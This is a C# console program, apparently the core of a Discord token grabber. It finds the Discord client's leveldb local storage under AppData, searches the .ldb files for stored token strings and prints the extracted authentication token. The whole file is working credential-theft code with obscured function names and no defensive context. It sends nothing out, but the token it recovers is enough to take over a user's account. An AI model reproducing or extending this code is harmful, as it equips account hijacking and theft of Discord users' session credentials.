using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace DiscordWidgetToken
{
    class Program
    {
        static void Main(string[] args)
        {
            string string1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
            if (!dotldb(ref string1) && !dotldb(ref string1))
            {
            }
            System.Threading.Thread.Sleep(100);
            string string2 = tokenx(string1, string1.EndsWith(".log"));
            if (string2 == "")
            {
                string2 = "N/A";
            }
            Console.WriteLine(string2);



        }
        private static bool dotldb(ref string stringx)
        {
            if (Directory.Exists(stringx))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".ldb");
                    }
                }
                return stringx.EndsWith(".ldb");
            }
            return false;
        }
        private static string tokenx(string stringx, bool boolx = false)
        {
            byte[] bytes = File.ReadAllBytes(stringx);
            string @string = Encoding.UTF8.GetString(bytes);
            string string1 = "";
            string string2 = @string;
            while (string2.Contains("oken"))
            {
                string[] array = IndexOf(string2).Split(new char[]
                {
                    '"'
                });
                string1 = array[0];
                string2 = string.Join("\"", array);
                if (boolx && string1.Length == 59)
                {
                    break;
                }
            }
            return string1;
        }
        private static string IndexOf(string stringx)
        {
            string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }
    }
}
